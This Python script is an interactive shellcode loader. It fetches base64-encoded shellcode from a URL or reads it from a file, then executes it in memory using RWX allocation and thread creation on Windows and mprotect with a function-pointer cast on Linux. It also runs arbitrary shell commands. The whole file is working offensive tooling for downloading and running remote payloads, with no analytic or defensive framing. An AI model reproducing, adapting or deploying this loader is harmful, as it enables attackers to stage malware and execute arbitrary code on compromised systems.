#! /usr/bin/python
import subprocess
import base64
import ctypes
import sys

def get_code_from_url(url):
    """
    Function to retrieve shellcode from a URL

    Args:
        url (str): The URL from which to retrieve the shellcode

    Returns:
        bytes: The decoded shellcode
    """
    try:
        import requests  # Module for making HTTP requests
        response = requests.get(url)
        if response.status_code == 200:
            return base64.b64decode(response.content)  # Decode base64 encoded content
        else:
            print("Failed to retrieve shellcode from URL")
            return None
    except Exception as e:
        print(f"Error occurred while retrieving shellcode: {e}")
        return None


def execute_command(command):
    """
    Function to execute a command in the shell

    Args:
        command (str): The command to execute

    Returns:
        str: Output of the command
    """
    try:
        # Run the command and capture the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode(sys.getdefaultencoding(), 'ignore')  # Decode bytes to string
    except subprocess.CalledProcessError as e:
        # If the command execution fails, return the error message
        return f"Error executing command: {e.output.decode(sys.getdefaultencoding(), 'ignore')}"


def run_shellcode(shellcode):
    """
    Function to execute shellcode

    Args:
        shellcode (bytes): The shellcode to execute
    """
    # Check the platform and execute shellcode accordingly
    if sys.platform.startswith('win'):
        # Windows platform
        kernel32 = ctypes.windll.kernel32
        ptr = kernel32.VirtualAlloc(kernel32.NULL, len(shellcode), 0x3000, 0x40)  # Allocate memory
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), shellcode,
                                             len(shellcode))  # Move shellcode to memory
        ctypes.windll.kernel32.CreateThread(kernel32.NULL, 0, ptr, kernel32.NULL, 0,
                                            0)  # Create thread to execute shellcode
        ctypes.windll.kernel32.WaitForSingleObject(kernel32.NULL, 0xFFFFFFFF)  # Wait for thread to finish
    elif sys.platform.startswith('linux'):
        # Linux platform
        libc = ctypes.CDLL(None)
        sc = ctypes.create_string_buffer(shellcode)
        size = len(shellcode)
        addr = libc.valloc(size)  # Allocate memory
        ctypes.memmove(addr, sc, size)  # Move shellcode to memory
        libc.mprotect(addr, size, 0x7)  # Set memory protection to allow execution
        func = ctypes.CFUNCTYPE(ctypes.c_void_p)
        runtime = ctypes.cast(addr, func)
        runtime()


if __name__ == '__main__':
    while True:
        user_input = input(
            "Enter 'cmd' to execute a command, 'file' to run a local file, or 'url' to run shellcode from a URL: ").strip().lower()

        if user_input == 'cmd':
            command = input("Enter command to execute: ")
            print(execute_command(command))  # Execute command and print output
        elif user_input == 'file':
            file_path = input("Enter path to the file: ")
            try:
                with open(file_path, 'rb') as f:
                    shellcode = f.read()  # Read shellcode from file
                run_shellcode(shellcode)  # Execute shellcode
            except Exception as e:
                print(f"Error reading or executing file: {e}")
        elif user_input == 'url':
            url = input("Enter URL to shellcode: ")
            shellcode = get_code_from_url(url)
            if shellcode:
                run_shellcode(shellcode)  # Execute shellcode
        else:
            print("Invalid input. Please enter 'cmd', 'file', or 'url'.")
